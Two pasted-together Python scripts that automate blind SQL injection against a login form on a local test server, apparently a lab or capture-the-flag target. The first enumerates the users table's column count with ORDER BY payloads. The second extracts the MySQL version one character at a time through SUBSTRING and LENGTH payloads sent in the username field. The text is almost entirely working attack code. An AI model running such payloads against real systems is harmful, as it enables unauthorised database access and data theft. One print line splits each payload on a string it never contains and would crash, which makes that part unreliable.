import requests
import time

base_url = "http://127.0.0.1:33038/index.php"
session_cookie = {"PHPSESSID": "ucv4hujhocgopm34cbotf0aitf"}

def send_payload(payload):
    data = {
        "username": payload,
        "password": "dummy",
        "submit": "Login"
    }
    try:
        response = requests.post(base_url, data=data, cookies=session_cookie, timeout=10)
        return '{"response":"password"}' in response.text
    except:
        return None

# Check if there's a plaintext column or if the password is stored differently
print("[*] Checking schema for additional columns...")

# Try to see if there are other columns in users table
print("\n[*] Checking column count in users table using ORDER BY...")
for i in range(1, 20):
    payload = f"' ORDER BY {i}-- -"
    result = send_payload(payload)
    print(f"[ORDER BY {i}]: {'Valid' if result else 'Invalid/Error'}")
    if not result:
        print(f"[*] Table appears to have {i-1} columns")
        break
    time.sleep(0.1)

import requests
import time

base_url = "http://127.0.0.1:33038/index.php"
session_cookie = {"PHPSESSID": "ucv4hujhocgopm34cbotf0aitf"}

def send_payload(payload):
    data = {
        "username": payload,
        "password": "dummy",
        "submit": "Login"
    }
    try:
        response = requests.post(base_url, data=data, cookies=session_cookie, timeout=10)
        return '{"response":"password"}' in response.text
    except:
        return None

# Get database version
print("[*] Getting database version...")
# Common MySQL version queries
version_tests = [
    "' or SUBSTRING(@@VERSION,1,1)='5'-- -",
    "' or SUBSTRING(@@VERSION,1,1)='6'-- -",
    "' or SUBSTRING(@@VERSION,1,1)='8'-- -",
    "' or SUBSTRING(@@VERSION,1,1)='1'-- -",
]

for test in version_tests:
    result = send_payload(test)
    print(f"Version test: {test.split('=@@VERSION,1,1)=')[1].split('--')[0]} -> {'TRUE' if result else 'FALSE'}")
    if result:
        break
    time.sleep(0.1)

# Check if we can get length of version string
print("\n[*] Getting version string length...")
for length in range(1, 30):
    payload = f"' or LENGTH(@@VERSION)={length}-- -"
    if send_payload(payload):
        print(f"[+] Version length: {length}")
        break
    time.sleep(0.1)

# Try to extract version character by character
print("\n[*] Extracting version string...")
version = ""
for pos in range(1, 25):
    for char in '0123456789.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-':
        payload = f"' or SUBSTRING(@@VERSION,{pos},1)='{char}'-- -"
        if send_payload(payload):
            version += char
            print(f"[+] Position {pos}: {char} -> Version: {version}")
            break
    else:
        break
    time.sleep(0.05)

print(f"\n[+] Database version: {version}")

